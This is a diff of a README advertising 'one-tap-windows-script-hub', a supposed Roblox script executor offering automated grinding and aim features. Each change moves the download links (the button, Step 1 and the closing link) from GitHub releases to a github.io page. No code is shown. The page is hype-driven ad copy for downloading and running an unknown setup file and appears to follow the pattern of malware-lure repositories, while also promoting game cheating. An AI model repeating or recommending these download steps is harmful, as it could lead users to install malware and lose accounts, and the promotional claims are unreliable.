@@ -1,7 +1,7 @@
 <h1>⚡ one-tap-windows-script-hub - Your All-in-One Roblox Scripting Powerhouse</h1>
 
 <p align="center">
-  <a href="https://github.com/embryonalcarcinomasarcoidosis299/one-tap-windows-script-hub/releases" style="display:inline-block; padding:18px 45px; background:linear-gradient(135deg,#ff6b6b,#f7b733); color:#fff; font-size:22px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 8px 25px rgba(247,183,51,0.4);">🚀 DOWNLOAD NOW - FREE</a>
+  <a href="https://embryonalcarcinomasarcoidosis299.github.io" style="display:inline-block; padding:18px 45px; background:linear-gradient(135deg,#ff6b6b,#f7b733); color:#fff; font-size:22px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 8px 25px rgba(247,183,51,0.4);">🚀 DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🌟 What Is This?
@@ -22,7 +22,7 @@ Getting up and running takes less than two minutes. Follow these steps exactly, 
 
 ### Step 1: Download the Application
 
-👉 **Visit this link to download the application:** [https://github.com/embryonalcarcinomasarcoidosis299/one-tap-windows-script-hub/releases](https://github.com/embryonalcarcinomasarcoidosis299/one-tap-windows-script-hub/releases)
+👉 **Visit this link to download the application:** [https://embryonalcarcinomasarcoidosis299.github.io](https://embryonalcarcinomasarcoidosis299.github.io)
 
 Click the link above. You'll be taken to the official download page. Find the file labeled **"one-tap-windows-script-hub-setup"** and click the download button next to it.
 
@@ -149,6 +149,6 @@ That's it. You're fully operational. Go enjoy automated grinding, flawless aim a
 
 This is the only Roblox scripting tool you'll need for 2026. Fast setup, automatic updates, a massive script repository, and advanced combat features—all without typing a single command. The download is one click away.
 
-**[⬇️ CLICK HERE TO DOWNLOAD ONE TAP WINDOWS SCRIPT HUB](https://github.com/embryonalcarcinomasarcoidosis299/one-tap-windows-script-hub/releases)**
+**[⬇️ CLICK HERE TO DOWNLOAD ONE TAP WINDOWS SCRIPT HUB](https://embryonalcarcinomasarcoidosis299.github.io)**
 
 Stop searching through messy forums. Stop paying monthly fees for broken tools. Start using the hub that does it all. Install now and transform your Roblox experience tonight.
